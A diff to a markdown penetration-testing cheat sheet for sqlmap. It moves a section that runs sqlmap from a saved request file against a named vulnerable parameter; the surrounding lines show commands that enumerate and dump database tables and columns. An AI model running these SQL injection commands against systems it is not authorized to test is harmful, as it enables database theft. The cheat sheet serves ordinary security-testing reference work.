@@ -20,6 +20,15 @@ sqlmap -u $ip -D DatabaseName -T TableName --columns
 ```
 sqlmap -u $ip -D DatabaseName -T TableName -C ColumnName --dump
 ```
+
+
+## Exploitation via specific packet
+```
+# Copy request to file e.g req.txt
+sqlmap -r req.txt -p VulnerableParameter --dbs
+...
+```
+
 ## Providing specific information to sqlmap
 ```
 --data "DataToBeSent"
@@ -35,12 +44,3 @@ sqlmap -u $ip -D DatabaseName -T TableName -C ColumnName --dump
     T: Time-based blind
     Q: Inline queries
 ```
-
-## Exploitation via specific packet
-```
-# Copy request to file e.g req.txt
-sqlmap -r req.txt -p VulnerableParameter --dbs
-...
-```
-
-
